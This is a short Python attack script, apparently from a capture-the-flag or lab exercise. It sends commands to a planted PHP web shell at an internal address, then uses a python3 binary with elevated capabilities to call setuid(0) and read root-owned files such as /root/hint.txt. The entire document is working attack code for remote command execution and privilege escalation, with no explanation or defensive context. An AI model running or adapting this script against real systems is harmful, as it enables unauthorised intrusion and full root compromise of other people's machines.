import urllib.request, urllib.parse, sys

def post(url, data):
    req = urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
                                 method="POST")
    try:
        return urllib.request.urlopen(req, timeout=60).read().decode("utf-8", "replace")
    except Exception as e:
        return "ERR: %s" % e

SHELL = "http://10.20.20.3/uploads/shell.php"

cmds = {
 "id":            "id",
 "getcap":        "getcap /usr/bin/python3 /usr/bin/python3.13 2>&1",
 "root_hint":     "python3 -c \"import os;os.setgid(0);os.setuid(0);os.system('cat /root/hint.txt')\"",
 "root_proof":    "python3 -c \"import os;os.setgid(0);os.setuid(0);os.system('id >/tmp/e && cat /tmp/e')\"",
}
for k, c in cmds.items():
    print("@@@ %s @@@" % k)
    print(post(SHELL, {"c": c}))
